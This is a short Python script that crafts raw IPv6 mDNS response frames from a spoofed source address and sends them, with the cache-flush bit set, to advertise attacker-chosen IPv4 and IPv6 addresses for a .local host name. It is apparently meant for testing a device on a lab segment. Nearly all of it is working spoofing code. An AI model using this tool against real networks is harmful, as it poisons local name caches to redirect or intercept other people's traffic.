"""Send an mDNS response for a host name with chosen address records and a chosen (spoofed) IPv6 source address.

Run inside a Docker `macvlan` container on the board's segment (needs NET_RAW), standard library only.
Usage: mdns_spoof.py <source ipv6> <name.local> <ipv4 or -> <ipv6[,ipv6...] or -> <count>
The responses are sent 0.3 s apart to ff02::fb, the packets carry the cache-flush bit like an announcement.
"""

import socket
import struct
import sys
import time


def name_wire(name):
    return b"".join(bytes([len(x)]) + x.encode() for x in name.split(".")) + b"\0"


def build_response(name, ipv4, ipv6_addresses):
    wire = name_wire(name)
    records = b""
    if ipv4:
        records += (
            wire + struct.pack(">HHIH", 1, 0x8001, 120, 4) + socket.inet_aton(ipv4)
        )
    for address in ipv6_addresses:
        records += (
            wire
            + struct.pack(">HHIH", 28, 0x8001, 120, 16)
            + socket.inet_pton(socket.AF_INET6, address)
        )
    count = bool(ipv4) + len(ipv6_addresses)
    return struct.pack(">HHHHHH", 0, 0x8400, 0, count, 0, 0) + records


def checksum(data):
    if len(data) % 2:
        data += b"\0"
    total = sum(struct.unpack(f">{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total & 0xFFFF) or 0xFFFF


def frame(mac, source, payload):
    group = socket.inet_pton(socket.AF_INET6, "ff02::fb")
    src = socket.inet_pton(socket.AF_INET6, source)
    length = 8 + len(payload)
    udp = struct.pack(">HHHH", 5353, 5353, length, 0) + payload
    pseudo = src + group + struct.pack(">IBBBB", length, 0, 0, 0, 17)
    udp = udp[:6] + struct.pack(">H", checksum(pseudo + udp)) + udp[8:]
    ip6 = struct.pack(">IHBB", 6 << 28, len(udp), 17, 255) + src + group
    return bytes.fromhex("3333000000fb") + mac + b"\x86\xdd" + ip6 + udp


def main():
    source, name, ipv4, ipv6, count = sys.argv[1:6]
    payload = build_response(
        name, None if ipv4 == "-" else ipv4, [] if ipv6 == "-" else ipv6.split(",")
    )
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind(("eth0", 0))
    data = frame(sock.getsockname()[4], source, payload)
    for _ in range(int(count)):
        sock.send(data)
        time.sleep(0.3)


if __name__ == "__main__":
    main()
